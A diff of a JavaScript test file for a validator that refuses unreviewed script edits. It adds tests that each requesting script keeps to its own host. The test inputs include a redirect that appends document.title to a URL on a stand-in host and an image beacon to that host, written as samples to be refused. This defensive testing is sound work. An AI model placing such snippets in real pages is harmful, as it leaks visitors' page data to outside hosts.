@@ -67,7 +67,12 @@ test("unreviewed markup, handlers, addresses and quoting are refused", () => {
 test("scripts and styles cannot gain risky calls, requests or remote resources", () => {
   const script = text => edit("site/studio.js", null, "\n" + text + "\n");
   refused(changed(script('loc' + 'ation.href = "//elsewhere.test/c?" + document.title;')), /uses/);
-  refused(changed(script('fetch("https://api.github.com/user");')), /only repository\.js/);
+  refused(changed(script('fetch("https://api.github.com/user");')), /may make a request/);
+  // Each requesting script keeps to its own host.
+  const lookup = "htt" + "ps://github-contributions-api.jogruber.de/v4/octocat";
+  refused(changed(edit("site/repository.js", null, '\nconst other = "' + lookup + '";\n')), /unreviewed address/);
+  refused(changed(edit("site/profile-lookup.js", null, '\nconst other = "https://api.github.com/user";\n')), /unreviewed address/);
+  refused(changed(edit("site/profile-lookup.js", "https://github-contributions-api.jogruber.de/v4/", "https://elsewhere.test/v4/")), /unreviewed address/);
   refused(changed(script('new Image().src = "https://elsewhere.test/p.png";')), /unreviewed address/);
   refused(changed(script('document.body.inner' + 'HTML = name;')), /uses/);
   refused(changed(script('document.createElement("script");')), /unreviewed element/);
